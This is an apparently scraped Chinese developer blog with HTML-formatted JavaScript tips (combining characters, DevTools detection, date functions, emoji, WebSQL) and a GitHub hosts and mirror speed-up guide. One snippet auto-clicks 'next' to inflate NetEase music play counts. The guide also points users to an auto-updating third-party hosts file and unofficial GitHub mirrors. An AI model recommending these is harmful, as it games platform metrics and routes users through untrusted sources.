class="line"> <span class="string">'呵呵'</span>+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0310'</span>);  <span class="comment">// "呵呵̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐"</span></span><br><span class="line"> <span class="string">'呵呵'</span>+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u031D'</span>);             <span class="comment">// "呵呵̝̝̝̝̝̝̝̝̝̝̝̝̝̝̝̝̝̝̝"</span></span><br><span class="line"> <span class="string">'呵呵'</span>+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0E47'</span>);                          <span class="comment">// "呵呵็็็็็็็็็็็็็็็็็็็"</span></span><br><span class="line"> <span class="string">'呵呵'</span>+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0e49'</span>);                                       <span class="comment">// "呵呵้้้้้้้้้้้้้้้้้้้"</span></span><br><span class="line"> <span class="string">'呵呵'</span>+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0598'</span>);        <span class="comment">// "呵呵֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘"</span></span><br><span class="line"></span><br><span class="line">也可以这么玩...</span><br><span class="line"></span><br><span class="line"> <span class="string">'呵呵'</span>+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0310'</span>)+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0598'</span>)+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0e49'</span>);  <span class="comment">// "呵呵้้้้้้้้้้้้้้้้้้้̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘"</span></span><br><span class="line">http:<span class="comment">//www.fileformat.info/info/unicode/category/Mn/list.htm  </span></span><br><span class="line">这里详细的列出了每个编码以及对应的意思，还有图片展现。https:<span class="comment">//www.cnblogs.com/52cik/p/unicode-mark-nonspacing.html#!comments</span></span><br></pre></td></tr></table></figure>
<h3 id="Chrome-监听-console-打开"><a href="#Chrome-监听-console-打开" class="headerlink" title="Chrome 监听 console 打开"></a>Chrome 监听 console 打开</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> re = <span class="regexp">/x/</span>;</span><br><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">console</span>.log(re);</span><br><span class="line"></span><br><span class="line">re.toString = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'第 '</span> + (++i) + <span class="string">' 次打开控制台'</span>;<span class="comment">//https://www.52cik.com/2016/04/27/chrome-console-open.html</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="操作之神奇的-date"><a href="#操作之神奇的-date" class="headerlink" title="操作之神奇的 date"></a>操作之神奇的 date</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取月份天数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMonthDayCount</span>(<span class="params">year, month</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(year, month, <span class="number">0</span>).getDate();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(getMonthDayCount(<span class="number">2017</span>, <span class="number">10</span>)); <span class="comment">// 31</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAllMonthDayCount</span>(<span class="params">year</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> days = [<span class="number">31</span>, <span class="keyword">new</span> <span class="built_in">Date</span>(year, <span class="number">2</span>, <span class="number">0</span>).getDate(), <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>];</span><br><span class="line">  <span class="keyword">return</span> days;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(getAllMonthDayCount(<span class="number">2016</span>));<span class="comment">// [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isLeapYear</span>(<span class="params">year</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (year % <span class="number">4</span> == <span class="number">0</span>) &amp;&amp; (year % <span class="number">100</span> != <span class="number">0</span> || year % <span class="number">400</span> == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isLeapYear</span>(<span class="params">year</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(year, <span class="number">2</span>, <span class="number">0</span>).getDate() === <span class="number">29</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log([</span><br><span class="line">  isLeapYear(<span class="number">2000</span>),</span><br><span class="line">  isLeapYear(<span class="number">2016</span>),</span><br><span class="line">  isLeapYear(<span class="number">2017</span>),</span><br><span class="line">  isLeapYear(<span class="number">2018</span>)</span><br><span class="line">]); <span class="comment">// [ true, true, false, false ]</span></span><br><span class="line"><span class="comment">// 10天后是几月几号</span></span><br><span class="line"><span class="keyword">var</span> dt = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'2016-12-25'</span>);</span><br><span class="line">dt.setDate(dt.getDate() + <span class="number">10</span>);</span><br><span class="line"><span class="built_in">console</span>.log(dt.toLocaleDateString()); <span class="comment">// 2017/1/4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 10天前是几月几号https://www.52cik.com/2017/10/11/js-date-month.html</span></span><br><span class="line"><span class="keyword">var</span> dt = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'2017-01-04'</span>);</span><br><span class="line">dt.setDate(dt.getDate() - <span class="number">10</span>);</span><br><span class="line"><span class="built_in">console</span>.log(dt.toLocaleDateString()); <span class="comment">// 2016/12/25</span></span><br></pre></td></tr></table></figure>
<h3 id="日期是否是连续"><a href="#日期是否是连续" class="headerlink" title="日期是否是连续"></a>日期是否是连续</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> days = [</span><br><span class="line">  <span class="string">'2016-02-28'</span>,</span><br><span class="line">  <span class="string">'2016-02-29'</span>, <span class="comment">// 闰月</span></span><br><span class="line">  <span class="string">'2016-03-01'</span>, <span class="comment">// 跨月</span></span><br><span class="line">  <span class="string">'2016-03-02'</span>,</span><br><span class="line">  <span class="string">'2016-03-03'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先排序，然后转时间戳</span></span><br><span class="line"><span class="keyword">let</span> _days = days.sort().map(<span class="function">(<span class="params">d, i</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> dt = <span class="keyword">new</span> <span class="built_in">Date</span>(d)</span><br><span class="line">  dt.setDate(dt.getDate() + <span class="number">4</span> - i) <span class="comment">// 处理为相同日期</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> +dt</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 比较时间戳是否一致</span></span><br><span class="line"><span class="built_in">console</span>.log(</span><br><span class="line">  _days[<span class="number">0</span>] == _days[<span class="number">1</span>] &amp;&amp;</span><br><span class="line">  _days[<span class="number">0</span>] == _days[<span class="number">2</span>] &amp;&amp;</span><br><span class="line">  _days[<span class="number">0</span>] == _days[<span class="number">3</span>] &amp;&amp;</span><br><span class="line">  _days[<span class="number">0</span>] == _days[<span class="number">4</span>]</span><br><span class="line">)</span><br><span class="line"><span class="keyword">let</span> days = [</span><br><span class="line">  <span class="string">'2016-02-28 12:00:00'</span>,</span><br><span class="line">  <span class="string">'2016-02-29 12:00:01'</span>, <span class="comment">// 闰月</span></span><br><span class="line">  <span class="string">'2016-03-01 12:00:02'</span>, <span class="comment">// 跨月</span></span><br><span class="line">  <span class="string">'2016-03-02 12:00:03'</span>,</span><br><span class="line">  <span class="string">'2016-03-03 12:00:04'</span>,</span><br><span class="line">  <span class="string">'2016-03-04 12:00:04'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(continueDays(days))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">continueDays</span>(<span class="params">arr_days</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 先排序，然后转时间戳</span></span><br><span class="line">  <span class="keyword">let</span> days = arr_days.sort().map(<span class="function">(<span class="params">d, i</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> dt = <span class="keyword">new</span> <span class="built_in">Date</span>(d)</span><br><span class="line">    dt.setDate(dt.getDate() + <span class="number">4</span> - i) <span class="comment">// 处理为相同日期</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 抹去 时 分 秒 毫秒</span></span><br><span class="line">    dt.setHours(<span class="number">0</span>)</span><br><span class="line">    dt.setMinutes(<span class="number">0</span>)</span><br><span class="line">    dt.setSeconds(<span class="number">0</span>)</span><br><span class="line">    dt.setMilliseconds(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> +dt</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> ret = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  days.forEach(<span class="function"><span class="params">d</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (days[<span class="number">0</span>] !== d) &#123;</span><br><span class="line">      ret = <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret</span><br><span class="line">&#125;https:<span class="comment">//www.52cik.com/2016/07/10/consecutive-dates.html</span></span><br></pre></td></tr></table></figure>
<h3 id="跨域代理工具"><a href="#跨域代理工具" class="headerlink" title="跨域代理工具"></a>跨域代理工具</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bing每日分享接口 </span><br><span class="line">http:<span class="comment">//cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1</span></span><br><span class="line">        http:<span class="comment">//www.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1&amp;mkt=zh-CN</span></span><br><span class="line">        直接在浏览器打开是如下的json,要拿到的就是url，直接在一个页面用js获取存在跨域问题，可以用代理工具 https:<span class="comment">//jsonp.afeld.me/ 我用的是第二个方法,把上面的api输入，</span></span><br><span class="line">        </span><br><span class="line">        点击go得到一个经过代理后的api，如下</span><br><span class="line">         </span><br><span class="line">        https:<span class="comment">//jsonp.afeld.me/?url=http%3A%2F%2Fcn.bing.com%2FHPImageArchive.aspx%3Fformat%3Djs%26idx%3D0%26n%3D1</span></span><br><span class="line">https:<span class="comment">//codepen.io/fazero/pen/KzooBZ  https://blog.fazero.me/2016/04/14/js-get-bing-photo/</span></span><br></pre></td></tr></table></figure>
<h3 id="网易云音乐刷听歌量"><a href="#网易云音乐刷听歌量" class="headerlink" title="网易云音乐刷听歌量"></a>网易云音乐刷听歌量</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setInterval(<span class="string">'document.getElementsByClassName("nxt")[0].click();console.log("Play OJBK. Next")'</span>,<span class="number">90000</span>);</span><br><span class="line">https:<span class="comment">//www.mmuaa.com/post/cd44019a0e569d64.html</span></span><br></pre></td></tr></table></figure>
<h3 id="emoji"><a href="#emoji" class="headerlink" title="emoji"></a>emoji</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JavaScript 字符串编码使用 UTF-16 https://gist.github.com/justjavac/a5aa1c0d0d111cf19e852037f4c483db</span></span><br><span class="line"><span class="string">"💩"</span>.length === <span class="number">2</span>;</span><br><span class="line"><span class="string">"💩"</span> === <span class="string">"\u&#123;1F4A9&#125;"</span>;    <span class="comment">// es6</span></span><br><span class="line"><span class="string">"💩"</span> === <span class="string">"\uD83D\uDCA9"</span>; <span class="comment">// es5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 同一个编码可能使用不同的码位</span></span><br><span class="line"><span class="string">"ò"</span> === <span class="string">"ò"</span>;       <span class="comment">// ❎</span></span><br><span class="line"><span class="string">"ò"</span> === <span class="string">"\xF2"</span>;    <span class="comment">// ✅</span></span><br><span class="line"><span class="string">"ò"</span> === <span class="string">"o\u0300"</span>; <span class="comment">// ✅</span></span><br><span class="line"><span class="string">"o\u0300"</span>.normalize(<span class="string">"NFC"</span>) === <span class="string">"\xF2"</span>; <span class="comment">// ✅ es6 提供了 normalize 函数</span></span><br><span class="line"></span><br><span class="line"><span class="string">"👨‍👩‍👧‍👦"</span>.length === <span class="number">11</span>;</span><br><span class="line"><span class="string">"👨‍👩‍👧‍👦"</span> === <span class="string">"\u&#123;1F468&#125;\u200D\u&#123;1F469&#125;\u200D\u&#123;1F467&#125;\u200D\u&#123;1F466&#125;"</span>;</span><br><span class="line"><span class="string">"👨"</span> === <span class="string">"\u&#123;1F468&#125;"</span>;</span><br><span class="line"><span class="string">"👩"</span> === <span class="string">"\u&#123;1F469&#125;"</span>;</span><br><span class="line"><span class="string">"👧"</span> === <span class="string">"\u&#123;1F467&#125;"</span>;</span><br><span class="line"><span class="string">"👦"</span> === <span class="string">"\u&#123;1F466&#125;"</span>;</span><br></pre></td></tr></table></figure>
<h3 id="本地存储websql"><a href="#本地存储websql" class="headerlink" title="本地存储websql"></a>本地存储websql</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">openDatabase：这个方法使用现有的数据库或者新建的数据库创建一个数据库对象。</span><br><span class="line">transaction：这个方法让我们能够控制一个事务，以及基于这种情况执行提交或者回滚。</span><br><span class="line">executeSql：这个方法用于执行实际的 SQL 查询。</span><br><span class="line">首先要想使用 WebSQL 首先得判断浏览器是否支持</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">window</span>.openDatabase)</span><br><span class="line">&#123;</span><br><span class="line">    alert(<span class="string">'您的浏览器不支持 WebSQL'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">打开数据库</span></span><br><span class="line"><span class="regexp">var db = window.openDatabase(dbname, version, dbdesc, dbsize,function() &#123;&#125;);</span></span><br><span class="line"><span class="regexp">openDatabase 方法中一共包括了 5 个参数,分别为数据库名、版本号、描述、数据库大小、创建回调。其中创建回调可以省略</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">例如创建 王者荣耀数据库</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">var db = openDatabase('wucai', '1.0', '王者荣耀数据库', 1024 * 1024);</span></span><br><span class="line"><span class="regexp">事务操作</span></span><br><span class="line"><span class="regexp">使用 transaction 对事务进行处理、执行提交、回滚操作</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">transaction(callback, errorCallback, successCallback); </span></span><br><span class="line"><span class="regexp">创建数据表</span></span><br><span class="line"><span class="regexp">db.transaction(function (tx) &#123;</span></span><br><span class="line"><span class="regexp">     tx.executeSql('CREATE TABLE IF NOT EXISTS heros (id unique, name, hp_max, mp_max, role_main)');</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br><span class="line"><span class="regexp">插入数据</span></span><br><span class="line"><span class="regexp">db.transaction(function (tx) &#123;</span></span><br><span class="line"><span class="regexp">    tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10000, "夏侯惇", 7350, 1746, " 坦克 ")');</span></span><br><span class="line"><span class="regexp">    tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10001, "钟无艳", 7000, 1760, " 战士 ")');</span></span><br><span class="line"><span class="regexp">    tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10002, "张飞", 8341, 100, " 坦克 ")');</span></span><br><span class="line"><span class="regexp">    tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10003, "牛魔", 8476, 1926, " 坦克 ")');</span></span><br><span class="line"><span class="regexp">    tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10004, "吕布", 7344, 0, " 战士 ")');</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br><span class="line"><span class="regexp">查找数据</span></span><br><span class="line"><span class="regexp">db.transaction(function (tx) &#123;</span></span><br><span class="line"><span class="regexp">    tx.executeSql('SELECT * FROM heros', [], function (tx, data) &#123;</span></span><br><span class="line"><span class="regexp">    var len = data.rows.length;</span></span><br><span class="line"><span class="regexp">    console.log('查找到：' +len +'条记录');</span></span><br><span class="line"><span class="regexp">    console.log(data.rows);</span></span><br><span class="line"><span class="regexp">    &#125;);</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br><span class="line"><span class="regexp">https:/</span><span class="regexp">/laravelcode.cn/</span>posts/<span class="number">99</span>/simple-use-<span class="keyword">of</span>-websql</span><br></pre></td></tr></table></figure>
<p>简单直接的 Javascript 开发环境 <a href="http://lixiaolai.com/2016/07/31/makecs-simplest-js-dev-environment/" target="_blank" rel="noopener">http://lixiaolai.com/2016/07/31/makecs-simplest-js-dev-environment/</a></p>
<p>前后端都开源的h5快速制作平台，类似于开源版本的易企秀、人人秀，可以通过拖拽的形式，快速生成H5，前端和后端都已经开源了，而且在持续迭代中 <a href="https://github.com/ly525/luban-h5" target="_blank" rel="noopener">https://github.com/ly525/luban-h5</a></p>
<p> alert xss <a href="https://alf.nu/alert1" target="_blank" rel="noopener">https://alf.nu/alert1</a></p>
<p><a href="https://github.com/fising/big-file-uploader" target="_blank" rel="noopener">通过文件分片解决大文件上传</a></p>
<p><a href="https://learnku.com/articles/31533" target="_blank" rel="noopener">JS 数据结构</a></p>
<p><a href="https://coolshell.cn/articles/17634.html" target="_blank" rel="noopener">CHROME开发者工具的小技巧</a></p>
<p><a href="https://juejin.im/post/5af53823f265da0b75282b0f#heading-11" target="_blank" rel="noopener">chrome开发者工具各种骚技巧</a></p>
<p><a href="https://neuqzxy.github.io/2017/11/16/webpack%E7%AC%94%E8%AE%B0-%E6%9C%8D%E5%8A%A1%E5%8F%8A%E7%83%AD%E6%9B%B4%E6%96%B0/" target="_blank" rel="noopener">webpack笔记-服务及热更新</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/28937831" target="_blank" rel="noopener">JavaScript编程黑科技</a></p>
<p><a href="https://learnku.com/docs/writing-docs/typography/3957" target="_blank" rel="noopener">中文文案排版规范</a></p>
<p><a href="https://github.com/pushmetop/30-seconds-for-everyday" target="_blank" rel="noopener">前端每日 30 秒</a></p>
<p><a href="https://zhangslob.github.io/2018/12/21/Chrome%E6%96%AD%E7%82%B9JS%E5%AF%BB%E6%89%BE%E6%B7%98%E5%AE%9D%E7%AD%BE%E5%90%8Dsign/" target="_blank" rel="noopener">Chrome断点JS寻找淘宝签名sign</a></p>
<p><a href="https://recordrtc.org/" target="_blank" rel="noopener">HTML 实现采集拍照功能</a></p>
<p><a href="http://nullpointer.pw/%E5%BE%AE%E4%BF%A1%E5%88%86%E4%BA%AB%E8%B8%A9%E5%9D%91%E4%B9%8B%E6%97%85.html" target="_blank" rel="noopener">微信分享踩坑之旅</a></p>
<p><a href="http://cuihuan.net/2019/05/12/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/" target="_blank" rel="noopener">字符编码那些事儿</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/13/github-精选项目收集/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/13/github-精选项目收集/" itemprop="url">github 精选项目收集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-13T11:30:29+08:00">
                2019-05-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="github代码clone加速"><a href="#github代码clone加速" class="headerlink" title="github代码clone加速"></a>github代码clone加速</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">github代码clone加速，hosts每日生成更新 http:<span class="comment">//nullpointer.pw </span></span><br><span class="line">https:<span class="comment">//github.com/Mosiki/github</span></span><br><span class="line"></span><br><span class="line">最简单的方式就是下载 Switch Host https:<span class="comment">//oldj.github.io/SwitchHosts/软件进行 host 修改，跨平台，因为 hosts 文件每日都会自动更新，所以需要本地的 hosts 也能自动更新， 好在 SwitchHosts 提供了远程 hosts 的功能。</span></span><br><span class="line"></span><br><span class="line">复制如下 hosts 地址</span><br><span class="line"> </span><br><span class="line">https:<span class="comment">//raw.githubusercontent.com/Mosiki/github/master/github_hosts.txt</span></span><br><span class="line"></span><br><span class="line"><span class="number">52.74</span><span class="number">.223</span><span class="number">.119</span> github.com</span><br><span class="line"><span class="number">59.24</span><span class="number">.3</span><span class="number">.173</span> gist.github.com</span><br><span class="line"><span class="number">185.199</span><span class="number">.108</span><span class="number">.153</span> assets-cdn.github.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> raw.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> gist.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> cloud.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.228</span><span class="number">.133</span> camo.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> avatars0.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> avatars1.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.228</span><span class="number">.133</span> avatars2.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.228</span><span class="number">.133</span> avatars3.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> avatars4.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> avatars5.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> avatars6.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> avatars7.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> avatars8.githubusercontent.com</span><br><span class="line"><span class="number">185.199</span><span class="number">.109</span><span class="number">.154</span> github.githubassets.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">设置自动更新</span><br><span class="line">选择 <span class="number">24</span> 小时即可，第一次添加的时候需要手动点击刷新按钮，刷新获取一下远程的 hosts</span><br><span class="line">http:<span class="comment">//nullpointer.pw/github%E4%BB%A3%E7%A0%81clone%E5%8A%A0%E9%80%9F.html</span></span><br><span class="line">https:<span class="comment">//www.codeku.me/archives/3031.html</span></span><br><span class="line">github镜像地址：https:<span class="comment">//i.codeku.me 替换 github.com</span></span><br><span class="line">下载镜像：https:<span class="comment">//ws.codeku.me 替换 codeload.github.com</span></span><br></pre></td></tr></table></figure>
